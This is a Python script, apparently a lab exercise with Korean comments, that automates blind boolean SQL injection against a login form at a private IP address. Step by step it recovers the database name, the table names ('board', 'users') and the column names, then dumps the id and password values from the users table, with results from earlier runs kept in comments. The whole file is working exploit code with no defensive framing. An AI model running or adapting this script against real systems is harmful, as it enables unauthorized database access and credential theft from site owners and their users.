import requests, json

MAX_LENGTH = 50
url = 'http://192.168.219.180/login/login_check.php'
cookie = {'PHPSESSID':'cookie'}

def fun_1():
    print('processing Fun_1...')
    num = 0
    while True:
        SQLINJq = f"' or 1=1 and length(database())={num}#"
        req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if "invalid" not in req.text:
            print(f"success with {num}")
            break
        num += 1
     
    return num
        ## 데이터베이스 이름 길이 알아내기 -> 4글자
'''
def fun_2_old(len):
    print('processing Fun_2...')
    num_2 = 65
    db=[]
    for num_1 in range(len):
        while True:
            SQLINJq = f"' or 1=1 and ascii(substring(database(), {num_1+1},1))={num_2}#"
            print(SQLINJq)
            req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
            if not "invalid" in req.text:
                print(f"success with {num_2}")
                db.append(chr(num_2))
                num_2 =65
                break
            num_2 = num_2+1
    print(db)
    ## DB 이름 알아내기 -> tree 
    '''
def fun_2(len_db):
    print('processing Fun_2...')
    db_name = ""
    for i in range(len_db):
        for j in range(65, 128):
            inj_str = f"' or 1=1 and ascii(substring(database(), {i+1}, 1)) = {j}#"
            resp = requests.post(url, data=f"id={inj_str}&pw=pw&login=Login", headers={'Content-Type': 'application/x-www-form-urlencoded'})
            if not "invalid" in resp.text:
                db_name += chr(j)
                break
    print (f'DB name: {db_name}')
'''
# NOT NEED THIS FUNCTION
def fun_3():
    num = 1
    
    while True:
        SQLINJq = f"' order by {num}#"
        req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if  req.status_code == 500:
            print(f"success with {num}")
            break
        num = num+1
    return num-1
    ## 현재컬럼 개수 알아내기 -> 2개



def fun_4_old(dbname,col_num):
    
    col=[]
    for num_1 in range(col_num):
        num_2 = 0
        while True:
            SQLINJq = f"' or 1=1 and length((select table_name from information_schema.tables where table_schema='{dbname}' limit {num_1},1))={num_2}#"
            req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
            if  not "invalid" in req.text:
                print(f"success with {num_2}")
                col.append(num_2)
                break
            num_2 = num_2+1
    print(col)
    return col
    
'''
def fun_4(dbname):
    print('processing Fun_4...')
    col =[]
    j = 0
    while True:
        i = 0
        while i <=MAX_LENGTH:
            SQLINJq = f"' or 1=1 and length((select table_name from information_schema.tables where table_schema='{dbname}' limit {j},1))={i}#"
            req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
            if "invalid" not in req.text:
                #print(f"success with {i}")
                col.append(i)
                break
            i += 1
        if i >50:
            break
        j += 1
    print(col)
    return col
## 각 테이블의 길이 알아내기 -> 5글자, 5글자

def fun_5(dbname,table_len):
    print('processing Fun_5...')
    res=[]
    for num_1 in range(len(table_len)):
        col=[]
        for num_2 in range(table_len[num_1]):
            num_3 = 65
            while True:
                SQLINJq = f"' or 1=1 and ascii(substring((select table_name from information_schema.tables where  table_schema='{dbname}' limit {num_1},1),{num_2+1},1)) = {num_3}#"
                req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
                if  "invalid" not in req.text:
                    #print(f"success with {num_3}")
                    col.append(chr(num_3))
                    break
                num_3 +=1
        res.append(''.join(col))
    print(res)
    return res
    ## 각 테이블의 이름 알아내기 -> board , users

'''
def fun_6_old(table_name):
    
    res=[]
    
    for num in range(len(table_name)):
        col=[]
        keep = 1
        num_1 = 0
        while keep:
            num_2 = 0
            while True:
                SQLINJq = f"' or 1=1 and length((select column_name from information_schema.columns where table_name='{table_name[num]}' limit {num_1},1))={num_2}#"
                
                req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
                if  not "invalid" in req.text:
                    print(f"success with {num_2}")
                    col.append(num_2)
                    break
                if num_2 > 50:
                    keep = 0
                    break
                num_2 = num_2+1
            if keep: 
                num_1 = num_1+1
            else:
                res.append(col)
    print(res)
    ## 각 테이블별 컬럼이름 길이 알아내기 -> [4,7,7,4,3,4], [19, 29, 24, 17, 4, 2, 2]]
'''
    
def fun_6(table_name):
    print('processing Fun_6...')
    res = []
    for name in table_name:
        col = []
        num_1, num_2 = 0, 0
        while num_2 <= MAX_LENGTH:
            SQLINJq = f"' or 1=1 and length((select column_name from information_schema.columns where table_name='{name}' limit {num_1},1))={num_2}#"
            req = requests.post(url, data=f"id={SQLINJq}&pw=pw&login=Login", headers={'Content-Type': 'application/x-www-form-urlencoded'})
            if 'invalid' not in req.text:
                #print(f"success with {num_2}")
                col.append(num_2)
                num_1, num_2 = num_1+1, 0
            else:
                num_2 += 1
        res.append(col)
    print(res)
    return res
    ## 각 테이블별 컬럼이름 길이 알아내기 -> [4,7,7,4,3,4], [19, 29, 24, 17, 4, 2, 2]

def fun_7(table_name,col_len):
    print('processing Fun_7...')
    res=[]
    for num_1 in range(len(col_len)):
        col=[]
        for num_2 in range(col_len[num_1]):
            num_3 = 65
            while True:
                SQLINJq = f"' or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='{table_name}' limit {num_1},1),{num_2+1},1)) = {num_3}#"
                req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
                if  "invalid" not in req.text:
                    #print(f"success with {num_3}")
                    col.append(chr(num_3))
                    break
                num_3 +=1
        res.append(''.join(col))
    print(res)
    ## 테이블별 컬럼 이름 알아내기


'''
def fun_8_old(table_name,col_name):
    print('processing Fun_8...')
    res=[]
    
    for num in range(len(col_name)):
        
        num_0 = 0
        keep2 = 1
        
        while keep2:
            col=[]
            keep = 1
            num_1 = 0
            
            while keep:
                num_2 = 32
                while True:
                    SQLINJq = f"' or 1=1 and ascii(substring((select {col_name[num]} from {table_name} limit {num_0},1),{num_1+1},1))={num_2}#"
                    #print(SQLINJq)
                    req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
                    if  "invalid" not in req.text:
                        #print(f"success with {num_2}")
                        col.append(chr(num_2))
                        break
                    if not num_1 and num_2>127:
                        keep = 0
                        keep2= 0
                        break
                    if num_2 > 127:
                        keep = 0
                        break
                    num_2 += 1
                if keep: 
                    num_1 += 1
                elif not keep and keep2:
                    res.append(''.join(col))
                    break
                else: 
                    break
            if keep2:
                num_0 += 1
            else:
                break
    print(res)
    ## 원하는 정보 얻어내기'''



def fun_8(table_name, col_names):
    print('processing Fun_8...')
    res = []
    
    for col_num, col_name in enumerate(col_names):
        num_0 = 0
        
        while True:
            col = []
            num_1 = 0
            while True:
                end = 0
                for num_2 in range(32, 128):
                    SQLINJq = f"' or 1=1 and ascii(substring((select {col_name} from {table_name} limit {num_0},1),{num_1+1},1))={num_2}#"
                    #print(SQLINJq)
                    req = requests.post(url, data=f"id={SQLINJq}&pw=pw&login=Login", headers={'Content-Type': 'application/x-www-form-urlencoded'})
                    if "invalid" not in req.text:
                        #print(f"success with {num_2}")
                        col.append(chr(num_2))
                        end = 1
                        break
                num_1 += 1
                if not end:
                    break
            if not col:
                break    
            res.append(''.join(col))
            num_0 += 1
    
    print(res)
    ## 원하는 정보 얻어내기


#fun_1()
#fun_2(4)
#fun_4('tree')
#fun_5('tree',[5,5])
#fun_6(['board','users'])
#fun_7('board',[3, 7, 4, 4, 7, 4])
#fun_7('users',[4, 19, 17, 29, 24, 2, 2])
#fun_8('users',['id','pw'])
